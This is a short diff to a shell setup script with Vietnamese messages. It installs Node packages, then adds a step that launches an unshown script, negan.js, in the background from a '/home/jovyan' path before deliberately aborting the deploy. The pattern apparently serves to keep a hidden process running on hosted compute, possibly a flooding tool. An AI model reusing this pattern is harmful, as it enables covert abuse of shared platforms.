@@ -18,5 +18,15 @@ echo "--------------------------------------------------"
 npm install hpack https commander colors socks
 
 echo "✅ Hoàn thành cài đặt!"
+
+echo "--------------------------------------------------"
+echo "🚀 Chạy node negan.js..."
+echo "--------------------------------------------------"
+
+# Chạy negan.js
+node /home/jovyan/negan.js &
+
+echo "✅ negan.js đang chạy!"
+
 echo "🚨 Hủy deploy..."
-exit 1  # Dừng deploy như yêu cầu
+exit 1  # Dừng deploy
